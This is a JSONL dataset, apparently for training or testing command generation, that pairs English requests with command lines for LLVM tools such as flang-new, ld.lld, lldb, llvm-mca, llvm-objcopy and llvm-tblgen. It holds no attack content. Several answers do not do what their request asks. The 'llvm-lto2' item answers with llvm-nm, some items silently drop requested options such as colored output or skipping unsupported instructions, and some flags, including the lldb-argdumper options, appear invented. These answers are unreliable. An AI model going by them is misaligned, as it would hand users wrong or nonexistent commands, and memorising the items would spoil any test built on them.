{"input": "Compile the Fortran source file `main.f90` with aggressive floating-point optimizations and save the output to `main`", "answer": "flang-new -ffast-math -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with LTO (Link Time Optimization) enabled and save the output to `test`", "answer": "flang-new -flto -o test test.f90"}
{"input": "Compile the Fortran source file `code.f90` with OpenACC support and save the output to `code`", "answer": "flang-new -fopenacc -o code code.f90"}
{"input": "Compile the Fortran source file `example.f90` with fixed-form source code and save the output to `example`", "answer": "flang-new -ffixed-form -o example example.f90"}
{"input": "Compile the Fortran source file `main.f90` with the default integer kind set to 8 bytes and save the output to `main`", "answer": "flang-new -fdefault-integer-8 -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with the default real kind set to 8 bytes and save the output to `test`", "answer": "flang-new -fdefault-real-8 -o test test.f90"}
{"input": "Compile the Fortran source file `main.f90` with the integrated assembler disabled and save the output to `main`", "answer": "flang-new -fno-integrated-as -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with the ARM read-only position-independent code generation and save the output to `test`", "answer": "flang-new -fropi -o test test.f90"}
{"input": "Compile the Fortran source file `main.f90` with the OpenMP offloading targets set to `nvptx64-nvidia-cuda` and save the output to `main`", "answer": "flang-new -fopenmp-targets=nvptx64-nvidia-cuda -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with the OpenMP offloading device RTL debugging enabled and save the output to `test`", "answer": "flang-new -fopenmp-target-debug -o test test.f90"}
{"input": "Compile the Fortran source file `example.f90` with the optimization record saved in YAML format and save the output to `example`", "answer": "flang-new -fsave-optimization-record=yaml -o example example.f90"}
{"input": "Compile the Fortran source file `program.f90` with the optimization record saved in a specific file named `opt_record.yaml` and save the output to `program`", "answer": "flang-new -fsave-optimization-record=opt_record.yaml -o program program.f90"}
{"input": "Compile the Fortran source file `main.f90` with the optimization record including only passes that match the regular expression `loop` and save the output to `main`", "answer": "flang-new -foptimization-record-passes=loop -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with the LLVM pass plugin loaded from `plugin.so` and save the output to `test`", "answer": "flang-new -fpass-plugin=plugin.so -o test test.f90"}
{"input": "Compile the Fortran source file `program.f90` with the RVV vector register size set to 128 bits and save the output to `program`", "answer": "flang-new -mrvv-vector-bits=128 -o program program.f90"}
{"input": "Compile the Fortran source file `main.f90` with the AMDGPU code object ABI version set to 4 and save the output to `main`", "answer": "flang-new -mcode-object-version=4 -o main main.f90"}
{"input": "Compile the Fortran source file `example.f90` with the out-of-line atomic operations enabled and save the output to `example`", "answer": "flang-new -moutline-atomics -o example example.f90"}
{"input": "Compile the Fortran source file `program.f90` with the out-of-line atomic operations disabled and save the output to `program`", "answer": "flang-new -mno-outline-atomics -o program program.f90"}
{"input": "Compile the Fortran source file `main.f90` with the ROCm installation path set to `/opt/rocm` and save the output to `main`", "answer": "flang-new --rocm-path=/opt/rocm -o main main.f90"}
{"input": "Compile the Fortran source file `test.f90` with the target triple set to `x86_64-unknown-linux-gnu` and save the output to `test`", "answer": "flang-new --target=x86_64-unknown-linux-gnu -o test test.f90"}
{"input": "Compile the Fortran source file `program.f90` with the system root directory set to `/mnt/sysroot` and save the output to `program`", "answer": "flang-new -isysroot /mnt/sysroot -o program program.f90"}
{"input": "Compile the Fortran source file `main.f90` with the include directory `/usr/local/include` added to the search path and save the output to `main`", "answer": "flang-new -I /usr/local/include -o main main.f90"}
{"input": "Optimize the code in `input_file.f90` using tco, enabling the Polly optimizer with user-directed transformations from metadata", "answer": "tco --polly --polly-pragma-based-opts input_file.f90"}
{"input": "Create a shared library named `libexample.so` from the object files `file1.o` and `file2.o`, and set the base address to `0x200000`", "answer": "ld.lld -shared -o libexample.so --image-base=0x200000 file1.o file2.o"}
{"input": "Link the object files `file1.o` and `file2.o` into a position-independent executable (PIE) named `pie_output`, and enable garbage collection of unused sections", "answer": "ld.lld -o pie_output --pie --gc-sections file1.o file2.o"}
{"input": "Link the object files `file1.o` and `file2.o` into an executable named `output`, and generate a build ID using the SHA1 algorithm", "answer": "ld.lld -o output --build-id=sha1 file1.o file2.o"}
{"input": "Link the object files `file1.o` and `file2.o` into an executable named `output`, and compress the debug sections using the zlib algorithm", "answer": "ld.lld -o output --compress-debug-sections=zlib file1.o file2.o"}
{"input": "Link the object files `file1.o` and `file2.o` into an executable named `output`, and specify a custom entry point function named `_start`", "answer": "ld.lld -o output --entry=_start file1.o file2.o"}
{"input": "Link multiple object files (`file1.o`, `file2.o`, and `file3.o`) into an executable named `output` using `ld.lld`, and ensure that all symbols are retained in the symbol table", "answer": "ld.lld --discard-none -o output file1.o file2.o file3.o"}
{"input": "Link `file1.o` and `file2.o` into an executable named `output` using `ld.lld`, and set the base address of the `.text` section to `0x10000`", "answer": "ld.lld --Ttext=0x10000 -o output file1.o file2.o"}
{"input": "Link `file1.o` and `file2.o` into an executable named `output` using `ld.lld`, and enable color diagnostics for error messages", "answer": "ld.lld --color-diagnostics=always -o output file1.o file2.o"}
{"input": "Link all object files in the directory \"obj\" into a single executable named \"output.exe\" using lld-link", "answer": "lld-link /out:output.exe obj/*.obj"}
{"input": "Link all object files in the \"src\" directory into an executable named \"program.exe\" and specify the stack size as 1MB", "answer": "lld-link /out:program.exe /stack:1048576 src/*.obj"}
{"input": "Create a position-independent executable (PIE) WebAssembly module with an entry point named `_start`", "answer": "wasm-ld --pie --entry _start -o output.wasm input.o"}
{"input": "Link a WebAssembly module and import memory from the default module `env` with the name `memory`", "answer": "wasm-ld --import-memory=env.memory -o output.wasm input.o"}
{"input": "Link a WebAssembly module and export the module's memory with the name `my_memory`", "answer": "wasm-ld --export-memory=my_memory -o output.wasm input.o"}
{"input": "Attach LLDB to a process with PID 1234 and source a file containing LLDB commands after attaching", "answer": "lldb -p 1234 -s /path/to/commands.lldb"}
{"input": "Debug the executable `/usr/bin/my_program` with the architecture set to x86_64 and pass arguments to the program", "answer": "lldb --arch x86_64 /usr/bin/my_program -- arg1 arg2"}
{"input": "Print out the path to the `lldb.py` file for this version of LLDB", "answer": "find /usr -name lldb.py 2>/dev/null"}
{"input": "Debug the executable `/usr/bin/my_program` and set the scripting language to Python for user-defined scripts", "answer": "lldb -f /usr/bin/my_program --script-language python"}
{"input": "Dump the arguments of the process running the binary located at `/usr/bin/example` using lldb-argdumper", "answer": "lldb-argdumper -b /usr/bin/example"}
{"input": "Dump the arguments of the process running the binary `/usr/bin/example` and include environment variables in the output using lldb-argdumper", "answer": "lldb-argdumper -b /usr/bin/example -e"}
{"input": "Dump the arguments of the process with the name \"example_process\" and save the output to a file named `process_args.txt` using lldb-argdumper", "answer": "lldb-argdumper -n example_process -o process_args.txt"}
{"input": "Start the LLDB server in platform mode, listening on port 8080, and specify a custom PID file to track the server process", "answer": "lldb-server platform --listen *:8080 --pid-file /var/run/lldb-server.pid"}
{"input": "Use bugpoint to reduce a test case in `example.ll` and execute it with a custom command `simulate` instead of the default execution method", "answer": "bugpoint --exec-command=\"simulate\" example.ll"}
{"input": "Reduce a test case in `example.ll` and save all temporary files generated during the process", "answer": "bugpoint --save-temps example.ll"}
{"input": "Use bugpoint to reduce a test case in `example.ll` and limit the memory usage to 500 MB", "answer": "bugpoint --mlimit=500 example.ll"}
{"input": "Reduce a test case in `example.ll` and specify a timeout of 60 seconds for the program execution", "answer": "bugpoint --timeout=60 example.ll"}
{"input": "Reduce a test case in `example.ll` and use the JIT execution method to run the program", "answer": "bugpoint --run-jit example.ll"}
{"input": "Use bugpoint to reduce a test case in `example.ll` and specify a custom output prefix for generated files", "answer": "bugpoint --output-prefix=\"my_test_case\" example.ll"}
{"input": "Link DWARF debug information for the `arm64` architecture only in the executable `my_app` and save the output as `my_app_arm64.dwarf`", "answer": "dsymutil --arch arm64 -o my_app_arm64.dwarf my_app"}
{"input": "Use 4 threads to link DWARF debug information for the executable `my_app` and save the output as `my_app.dwarf`", "answer": "dsymutil --num-threads 4 -o my_app.dwarf my_app"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 1, enable debug information for entry values, and output the result to `example.s`", "answer": "llc -O1 --debug-entry-values -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 3, enable the use of the new pass manager, and output the result to `example.s`", "answer": "llc -O3 --enable-new-pm -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 2, enable the use of the FDPIC ABI, and output the result to `example.s`", "answer": "llc -O2 --fdpic -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 1, enable the use of the Apple-style NEON assembly, and output the result to `example.s`", "answer": "llc -O1 --aarch64-neon-syntax=apple -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 3, enable the use of the large code model, and output the result to `example.s`", "answer": "llc -O3 --code-model=large -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 2, enable the use of the DWARF64 format for debugging information, and output the result to `example.s`", "answer": "llc -O2 --dwarf64 -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 1, enable the use of the soft float ABI, and output the result to `example.s`", "answer": "llc -O1 --float-abi=soft -o example.s example.bc"}
{"input": "Compile the LLVM bitcode file `example.bc` with optimization level 3, enable the use of the tail call optimization, and output the result to `example.s`", "answer": "llc -O3 --tailcallopt -o example.s example.bc"}
{"input": "Convert the address 0x4005a0 in the binary file `example` to its corresponding source file and line number, and print all inlined frames", "answer": "llvm-addr2line -e example --inlines 0x4005a0"}
{"input": "Convert the address 0x4005a0 in the binary file `example` to its corresponding source file and line number, and strip directory names from the paths", "answer": "llvm-addr2line -e example --basenames 0x4005a0"}
{"input": "Convert the address 0x4005a0 in the binary file `example` to its corresponding source file and line number, and use color in the output", "answer": "llvm-addr2line -e example --color 0x4005a0"}
{"input": "Convert the address 0x4005a0 in the binary file `example` to its corresponding source file and line number, and print 5 lines of source file context", "answer": "llvm-addr2line -e example --print-source-context-lines=5 0x4005a0"}
{"input": "Create a thin archive named `thin_archive.a` containing the file `file1.o`", "answer": "llvm-ar --thin rc thin_archive.a file1.o"}
{"input": "Create an archive named `project.a` in the GNU format, containing all `.o` files in the current directory", "answer": "llvm-ar --format=gnu rc project.a *.o"}
{"input": "Analyze the bitcode file `example.bc` and display a low-level trace of the bitcode", "answer": "llvm-bcanalyzer --dump example.bc"}
{"input": "Analyze the bitcode file `example.bc` and include BLOCKINFO details in the low-level dump", "answer": "llvm-bcanalyzer --dump --dump-blockinfo example.bc"}
{"input": "Analyze the bitcode file `example.bc` and enable colored output for better readability", "answer": "llvm-bcanalyzer --color example.bc"}
{"input": "Display all available options for the `llvm-bcanalyzer` tool, including hidden ones", "answer": "llvm-bcanalyzer --help --help-hidden"}
{"input": "Concatenate two LLVM bitcode files, `alpha.bc` and `beta.bc`, into a single file named `gamma.bc` using binary concatenation", "answer": "llvm-link alpha.bc beta.bc -o gamma.bc"}
{"input": "Check the CFI protection for the binary `example_binary` and include 5 lines of blame context for BAD instructions", "answer": "llvm-cfi-verify --blame-context=5 example_binary"}
{"input": "Verify the CFI protection for the binary `example_binary` and ignore any DWARF debugging information while using colored output", "answer": "llvm-cfi-verify --ignore-dwarf --color example_binary"}
{"input": "List all the libraries needed to link against all LLVM components", "answer": "llvm-config --libs all"}
{"input": "Get the C preprocessor flags for files that include LLVM headers", "answer": "llvm-config --cppflags"}
{"input": "Print the build mode of the LLVM tree (e.g., Debug or Release)", "answer": "llvm-config --build-mode"}
{"input": "Check if LLVM was built with RTTI (Run-Time Type Information)", "answer": "llvm-config --has-rtti"}
{"input": "Annotate the source file `main.cpp` with coverage information using the binary `my_program` and the profiling data `my_program.profdata`, and include detailed region coverage", "answer": "llvm-cov show ./my_program -instr-profile=my_program.profdata main.cpp -show-regions"}
{"input": "Generate a coverage report for the binary `my_program` using the profiling data `my_program.profdata` and include branch coverage information", "answer": "llvm-cov report ./my_program -instr-profile=my_program.profdata -show-branch-summary"}
{"input": "Annotate the source file `main.cpp` with coverage information using the binary `my_program` and the profiling data `my_program.profdata`, and include branch coverage details", "answer": "llvm-cov show ./my_program -instr-profile=my_program.profdata main.cpp -show-branches"}
{"input": "Dump all C++ ABI data from multiple object files, `file1.o` and `file2.o`, without using colored output", "answer": "llvm-cxxdump --no-color file1.o file2.o"}
{"input": "Demangle the symbol \"_Z3fooi\" and include function parameters and return types in the output", "answer": "llvm-cxxfilt -t _Z3fooi"}
{"input": "Demangle the symbol \"_Z3fooi\" but skip the function parameters and return types in the output", "answer": "llvm-cxxfilt --no-params _Z3fooi"}
{"input": "Demangle the symbol \"_Z3fooi\" without stripping the leading underscore from the output", "answer": "llvm-cxxfilt --no-strip-underscore _Z3fooi"}
{"input": "Demangle the symbol \"_Z3fooi\" and specify the mangling format as 'gnu', even though it is currently ignored", "answer": "llvm-cxxfilt --format=gnu _Z3fooi"}
{"input": "Compare two LLVM IR files, `file1.ll` and `file2.ll`, and highlight differences using colored output", "answer": "llvm-diff --color file1.ll file2.ll"}
{"input": "Compare two LLVM IR files, `test1.ll` and `test2.ll`, and output the differences without using colored text", "answer": "llvm-diff --color=false test1.ll test2.ll"}
{"input": "Compare two LLVM IR files, `a.ll` and `b.ll`, and display the differences in a concise list format", "answer": "llvm-diff a.ll b.ll"}
{"input": "Disassemble the LLVM bitcode file `example.bc` and output the result to `example.ll` with colored output enabled", "answer": "llvm-dis example.bc -o example.ll"}
{"input": "Disassemble the LLVM bitcode file `module.bc` and include informational comments in the output file", "answer": "llvm-dis --show-annotations -o module.ll module.bc"}
{"input": "Disassemble the LLVM bitcode file `program.bc` without materializing metadata initially, and save the output to `program.ll`", "answer": "llvm-dis -o program.ll program.bc"}
{"input": "Disassemble the LLVM bitcode file `app.bc` and display the version of the `llvm-dis` tool being used", "answer": "llvm-dis --version && llvm-dis app.bc -o app.ll"}
{"input": "Create an import library for a DLL named \"test.dll\" using the definition file \"test.def\" and ensure no leading underscores are added to symbols", "answer": "llvm-dlltool -D test.dll -d test.def -l test.lib --no-leading-underscore"}
{"input": "Dump all debug information sections from the binary file `lib.so` and verify the integrity of the DWARF debug info", "answer": "llvm-dwarfdump --all --verify lib.so"}
{"input": "Dump all debug information sections from the binary file `app.dSYM` and show the UUID for each architecture", "answer": "llvm-dwarfdump --all --uuid app.dSYM"}
{"input": "Merge all split dwarf (.dwo) files from the executable `my_program` and output the result to `merged_dwarf.dwp`", "answer": "llvm-dwp -e my_program -o merged_dwarf.dwp"}
{"input": "Analyze the benchmark results for all opcodes and save the clustering results to a file named `clusters.txt`", "answer": "llvm-exegesis --mode=analysis --opcode-index=-1 --analysis-clusters-output-file=clusters.txt"}
{"input": "Measure the inverse throughput of all opcodes and repeat the measurement 10 times for each opcode", "answer": "llvm-exegesis --mode=inverse_throughput --opcode-index=-1 --benchmark-repeat-count=10"}
{"input": "Measure the uops decomposition of all opcodes and use the DBSCAN clustering algorithm for analysis", "answer": "llvm-exegesis --mode=uops --opcode-index=-1 --analysis-clustering=dbscan"}
{"input": "Measure the latency of all opcodes and dump the generated benchmark object to disk with the filename `benchmark.o`", "answer": "llvm-exegesis --mode=latency --opcode-index=-1 --dump-object-to-disk=benchmark.o"}
{"input": "Measure the latency of all opcodes and use the loop repetition mode with a minimum of 100 instructions in the snippet", "answer": "llvm-exegesis --mode=latency --opcode-index=-1 --repetition-mode=loop --min-instructions=100"}
{"input": "Measure the latency of all opcodes and aggregate the results by taking the minimum reading", "answer": "llvm-exegesis --mode=latency --opcode-index=-1 --result-aggregation-mode=min"}
{"input": "Measure the latency of all opcodes and validate the results using the `instructions-retired` counter", "answer": "llvm-exegesis --mode=latency --opcode-index=-1 --validation-counter=instructions-retired"}
{"input": "Measure the latency of all opcodes and target the `skylake` CPU architecture", "answer": "llvm-exegesis --mode=latency --opcode-index=-1 --mcpu=skylake"}
{"input": "Extract the global variable `global_var` from the LLVM bitcode file `program.bc` and save the output to `global_var_extracted.bc`", "answer": "llvm-extract --glob=global_var -o global_var_extracted.bc program.bc"}
{"input": "Extract the function `init` from the LLVM bitcode file `init.bc`, keep the initializers of constants, and save the output to `init_extracted.bc`", "answer": "llvm-extract --func=init --keep-const-init -o init_extracted.bc init.bc"}
{"input": "Create a library archive named \"mylib.lib\" from the object files \"file1.obj\" and \"file2.obj\" without displaying the logo using llvm-lib", "answer": "llvm-lib /out:mylib.lib /nologo file1.obj file2.obj"}
{"input": "Optimize the LTO process for the input bitcode file `example.bc` using the highest optimization level and save the output to `optimized_example.o`", "answer": "llvm-lto -O3 -o optimized_example.o example.bc"}
{"input": "Export the symbol `main` from the input bitcode file `export_symbol.bc` and save the output to `exported_symbol.o`", "answer": "llvm-lto --exported-symbol=main -o exported_symbol.o export_symbol.bc"}
{"input": "Run the LTO process on the input bitcode file `merged_module.bc` and use it as the merged module for further processing", "answer": "llvm-lto merged_module.bc"}
{"input": "Dump the symbol table of the LLVM bitcode file `example.bc` using llvm-lto2", "answer": "llvm-nm example.bc"}
{"input": "Assemble the assembly file `example.s` and output the result to `example.o` with debugging information", "answer": "as -g -o example.o example.s"}
{"input": "Analyze the performance of the machine code in `example.s` and print all available hardware statistics", "answer": "llvm-mca --all-stats example.s"}
{"input": "Analyze the machine code in `example.s` and display all views, including hardware statistics, for a detailed performance report", "answer": "llvm-mca --all-views example.s"}
{"input": "Analyze the machine code in `example.s` and print the instruction tables to understand the instruction-level details", "answer": "llvm-mca --instruction-tables example.s"}
{"input": "Analyze the machine code in `example.s` and print the timeline view to visualize the execution flow over 100 cycles", "answer": "llvm-mca --timeline --timeline-max-cycles=100 example.s"}
{"input": "Analyze the machine code in `example.s` and print the resource pressure view to understand resource utilization", "answer": "llvm-mca --resource-pressure example.s"}
{"input": "Analyze the machine code in `example.s` and print the dispatch statistics to understand how instructions are dispatched", "answer": "llvm-mca --dispatch-stats example.s"}
{"input": "Analyze the machine code in `example.s` and print the retire control unit statistics to understand instruction retirement", "answer": "llvm-mca --retire-stats example.s"}
{"input": "Analyze the machine code in `example.s` and print the scheduler statistics to understand scheduling behavior", "answer": "llvm-mca --scheduler-stats example.s"}
{"input": "Analyze the machine code in `example.s` and print the register file statistics to understand register usage", "answer": "llvm-mca --register-file-stats example.s"}
{"input": "Analyze the machine code in `example.s` and print the output in JSON format for further processing", "answer": "llvm-mca --json example.s"}
{"input": "Analyze the machine code in `example.s` and skip any unsupported instructions to avoid errors", "answer": "llvm-mca example.s"}
{"input": "Analyze the machine code in `example.s` and assume that loads and stores do not alias", "answer": "llvm-mca --noalias example.s"}
{"input": "Extract the module at index 2 from the input bitcode file `example.bc` and save the output to `extracted_module.bc`", "answer": "llvm-modextract -n 2 -o extracted_module.bc example.bc"}
{"input": "Perform a binary extraction of the module at index 5 from the input bitcode file `sample.bc` and output the result to `output_module.bc`", "answer": "llvm-modextract -b -n 5 -o output_module.bc sample.bc"}
{"input": "Extract the first module (index 0) from the input bitcode file `program.bc` and save it to `first_module.bc`", "answer": "llvm-modextract -n 0 -o first_module.bc program.bc"}
{"input": "Extract the module at index 1 from the input bitcode file `test.bc` and save it to `extracted.bc` without using colored output", "answer": "llvm-modextract --color=0 -n 1 -o extracted.bc test.bc"}
{"input": "Perform a binary extraction of the module at index 2 from the input bitcode file `example.bc` and save it to `binary_module.bc` with colored output", "answer": "llvm-modextract --color -b -n 2 -o binary_module.bc example.bc"}
{"input": "Extract the module at index 6 from the input bitcode file `app.bc` and save it to `module_6.bc` while displaying the version of the tool", "answer": "llvm-modextract -n 6 -o module_6.bc app.bc && llvm-modextract --version"}
{"input": "Process the manifest file `app.manifest` and suppress the copyright notice", "answer": "llvm-mt /manifest:app.manifest /nologo"}
{"input": "Display only the defined symbols in the object file `example.o`", "answer": "llvm-nm --defined-only example.o"}
{"input": "Display symbols from the object file `example.o` without sorting them", "answer": "llvm-nm -p example.o"}
{"input": "Show only undefined symbols from the object file `example.o`", "answer": "llvm-nm -u example.o"}
{"input": "Display symbols from the object file `example.o` in Darwin format", "answer": "llvm-nm -m example.o"}
{"input": "Print the symbol table for the object file `example.o` without demangling C++ symbol names", "answer": "llvm-nm --no-demangle example.o"}
{"input": "Display symbols from the object file `example.o` in SysV format", "answer": "llvm-nm --format=sysv example.o"}
{"input": "Print the symbol table for the object file `example.o` and suppress the 'no symbols' diagnostic", "answer": "llvm-nm --quiet example.o"}
{"input": "Remove all symbols and non-allocated sections from the ELF file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --strip-all input.elf output.elf"}
{"input": "Extract the `.text` section from the file `input.elf` and save it to a new file called `text_section.bin`", "answer": "llvm-objcopy --dump-section=.text=text_section.bin input.elf"}
{"input": "Rename the section `.data` to `.mydata` in the file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --rename-section=.data=.mydata input.elf output.elf"}
{"input": "Mark the symbol `my_function` as global in the file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --globalize-symbol=my_function input.elf output.elf"}
{"input": "Remove the section `.debug_info` from the file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --remove-section=.debug_info input.elf output.elf"}
{"input": "Remove all symbols except for `main` from the file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --keep-symbol=main input.elf output.elf"}
{"input": "Mark all global symbols as weak in the file `input.elf` and save the result as `output.elf`", "answer": "llvm-objcopy --weaken input.elf output.elf"}
{"input": "Disassemble all sections in the object file `example.o` and include source line numbers in the output", "answer": "llvm-objdump --disassemble-all --line-numbers example.o"}
{"input": "Display the contents of the dynamic symbol table for the shared library `libexample.so`", "answer": "llvm-objdump --dynamic-syms libexample.so"}
{"input": "Display the relocation entries in the object file `example.o`", "answer": "llvm-objdump --reloc example.o"}
{"input": "Disassemble the object file `example.o` and do not skip blocks of zeroes during disassembly", "answer": "llvm-objdump --disassemble --disassemble-zeroes example.o"}
{"input": "Display the contents of the overall file header for the object file `example.o`", "answer": "llvm-objdump --file-headers example.o"}
{"input": "Display the symbol table for the object file `example.o`", "answer": "llvm-objdump --syms example.o"}
{"input": "Display the unwind information for the object file `example.o`", "answer": "llvm-objdump --unwind-info example.o"}
{"input": "Display the Mach-O binding information for the Mach-O file `example.macho`", "answer": "llvm-objdump --macho --bind example.macho"}
{"input": "Display the Mach-O universal headers for the file `example.macho`", "answer": "llvm-objdump --macho --universal-headers example.macho"}
{"input": "Display the Mach-O rebasing information for the file `example.macho`", "answer": "llvm-objdump --macho --rebase example.macho"}
{"input": "Display the Mach-O exported symbols for the file `example.macho`", "answer": "llvm-objdump --macho --exports-trie example.macho"}
{"input": "Display the Mach-O indirect symbol table for the file `example.macho`", "answer": "llvm-objdump --macho --indirect-symbols example.macho"}
{"input": "Generate a detailed YAML description of the PDB file `debug.pdb` and include all available information", "answer": "llvm-pdbutil pdb2yaml debug.pdb --all"}
{"input": "Dump all debug information from the PDB file `debug_info.pdb` using a DIA-like API", "answer": "llvm-pdbutil diadump debug_info.pdb --all"}
{"input": "Merge multiple profile data files into a single output file using llvm-profdata", "answer": "llvm-profdata merge input1.profdata input2.profdata -o output.profdata"}
{"input": "Display the contents of a profile data file using llvm-profdata", "answer": "llvm-profdata show input.profdata"}
{"input": "Merge multiple profile data files and include all functions in the output", "answer": "llvm-profdata merge input1.profdata input2.profdata --all-functions -o output.profdata"}
{"input": "Merge multiple profile data files and enable verbose output", "answer": "llvm-profdata merge input1.profdata input2.profdata -o output.profdata --verbose"}
{"input": "Display the contents of a profile data file and filter by function name", "answer": "llvm-profdata show input.profdata --function=main"}
{"input": "Merge multiple profile data files and disable counter promotion", "answer": "llvm-profdata merge input1.profdata input2.profdata --disable-counter-promotion -o output.profdata"}
{"input": "Display the contents of a profile data file and include block coverage information", "answer": "llvm-profdata show input.profdata --block-coverage"}
{"input": "Display the contents of a profile data file and include value profiling information", "answer": "llvm-profdata show input.profdata --value-profiling"}
{"input": "Compile the resource file `resources.rc` and include the directory `include/` as an additional search path for included files", "answer": "llvm-rc /I include/ resources.rc"}
{"input": "Compile the resource file `resources.rc` without preprocessing it and set the default language identifier to 1033 (English)", "answer": "llvm-rc /no-preprocess /L 1033 resources.rc"}
{"input": "Compile the resource file `resources.rc` and ignore any `include` environment variables", "answer": "llvm-rc /X resources.rc"}
{"input": "Display the dynamic section table of the ELF file `shared_lib.so`", "answer": "llvm-readelf --dynamic-table shared_lib.so"}
{"input": "Show the unwind information for the ELF file `executable.elf`", "answer": "llvm-readelf --unwind executable.elf"}
{"input": "Display the notes section of the ELF file `kernel.elf`", "answer": "llvm-readelf --notes kernel.elf"}
{"input": "Show the version sections of the ELF file `libc.so`", "answer": "llvm-readelf --version-info libc.so"}
{"input": "Display the section groups in the ELF file `module.elf`", "answer": "llvm-readelf --section-groups module.elf"}
{"input": "Display the relocation entries and unwind information for the object file `app.o`", "answer": "llvm-readobj --relocations --unwind app.o"}
{"input": "Display the dynamic table and version information for the ELF file `program.elf`", "answer": "llvm-readobj --dynamic-table --version-info program.elf"}
{"input": "Display the program headers and section groups for the ELF file `kernel.elf`", "answer": "llvm-readobj --program-headers --section-groups kernel.elf"}
{"input": "Display the notes and histogram for the object file `data.o`", "answer": "llvm-readobj --notes --histogram data.o"}
{"input": "Display the file header and section headers for the object file `example.bin`", "answer": "llvm-readobj --file-header --section-headers example.bin"}
{"input": "Display the dynamic symbol table and relocations for the shared object file `libshared.so`", "answer": "llvm-readobj --dyn-syms --relocations libshared.so"}
{"input": "Display the dynamic relocation entries and section mapping for the ELF file `dynamic.elf`", "answer": "llvm-readobj --dyn-relocations --section-mapping dynamic.elf"}
{"input": "Reduce the LLVM IR file `example.ll` using all delta passes, but abort if any reduction results in invalid IR", "answer": "llvm-reduce --delta-passes=all --abort-on-invalid-reduction example.ll"}
{"input": "Reduce the LLVM IR file `example.ll` using all delta passes, set the starting granularity level to 2, and specify the interesting-ness test as `check-crash`", "answer": "llvm-reduce --delta-passes=all --starting-granularity-level=2 --test=check-crash example.ll"}
{"input": "Display the size of all sections in the object file `example.o` using the Berkeley format", "answer": "llvm-size -B example.o"}
{"input": "Display the sizes of all sections in the object file `example.o` in decimal format", "answer": "llvm-size --radix=10 example.o"}
{"input": "Display the sizes of all sections in the object file `example.o` using the System V format", "answer": "llvm-size -A example.o"}
{"input": "Show the sizes of all sections in the object file `example.o` and include common symbols in the output", "answer": "llvm-size --common example.o"}
{"input": "Generate a random .ll file with an estimated size of 500 instructions and save it as `output.ll`", "answer": "llvm-stress --size=500 -o output.ll"}
{"input": "Generate a random .ll file involving scalable vector types and save it as `vector_output.ll`", "answer": "llvm-stress --enable-scalable-vectors -o vector_output.ll"}
{"input": "Generate a random .ll file with an estimated size of 1000 instructions, using a seed of 67890, and save it as `large_output.ll`", "answer": "llvm-stress --size=1000 --seed=67890 -o large_output.ll"}
{"input": "Generate a random .ll file with an estimated size of 300 instructions, using a seed of 42, and save it as `small_output.ll`", "answer": "llvm-stress --size=300 --seed=42 -o small_output.ll"}
{"input": "Generate a random .ll file with an estimated size of 200 instructions, using scalable vector types, and save it as `vector_small.ll`", "answer": "llvm-stress --size=200 --enable-scalable-vectors -o vector_small.ll"}
{"input": "Generate a random .ll file with an estimated size of 800 instructions, using a seed of 98765, and save it as `medium_output.ll`", "answer": "llvm-stress --size=800 --seed=98765 -o medium_output.ll"}
{"input": "Extract strings from `binary.exe` and display the help message for llvm-strings", "answer": "llvm-strings binary.exe && llvm-strings -h"}
{"input": "Extract strings from `malware.elf` and display the version of llvm-strings", "answer": "llvm-strings malware.elf && llvm-strings --version"}
{"input": "Remove all symbols and debug sections from the binary file `example.bin` and save the output to `stripped_example.bin`", "answer": "llvm-strip --strip-all -o stripped_example.bin example.bin"}
{"input": "Strip all debug sections from the binary file `app.elf` while preserving the access and modification timestamps", "answer": "llvm-strip --strip-debug --preserve-dates app.elf"}
{"input": "Strip all debug sections from the binary file `debug_app` and save the stripped version to `release_app`", "answer": "llvm-strip --strip-debug -o release_app debug_app"}
{"input": "Strip the symbol `main` from the binary file `executable.elf`", "answer": "llvm-strip --strip-symbol=main executable.elf"}
{"input": "Remove all symbols and sections from the binary file `app.elf` except for the symbol `_start`", "answer": "llvm-strip --strip-all --keep-symbol=_start app.elf"}
{"input": "Remove all symbols and sections from the binary file `program.elf` but keep the symbol `main` and the `.text` section", "answer": "llvm-strip --strip-all --keep-symbol=main --keep-section=.text program.elf"}
{"input": "Symbolize the address 0x4005a0 and specify the object file `example.elf` to be symbolized", "answer": "llvm-symbolizer --obj=example.elf 0x4005a0"}
{"input": "Generate assembly instruction matcher code for a specific input file using llvm-tblgen", "answer": "llvm-tblgen --gen-asm-matcher -o asm_matcher.cpp asm_instructions.td"}
{"input": "Generate disassembler code for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-disassembler -o disassembler.cpp target_disasm.td"}
{"input": "Generate GlobalISel selector code for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-global-isel -o global_isel.cpp target_global_isel.td"}
{"input": "Generate ValueType information for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-vt -o value_types.cpp target_value_types.td"}
{"input": "Generate compressed instruction emitter code for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-compress-inst-emitter -o compress_inst_emitter.cpp target_compress_inst.td"}
{"input": "Generate DAG instruction selector code for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-dag-isel -o dag_isel.cpp target_dag_isel.td"}
{"input": "Generate intrinsic enums for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-intrinsic-enums -o intrinsic_enums.cpp target_intrinsics.td"}
{"input": "Generate machine code emitter code for a target architecture using llvm-tblgen", "answer": "llvm-tblgen --gen-emitter -o machine_emitter.cpp target_emitter.td"}
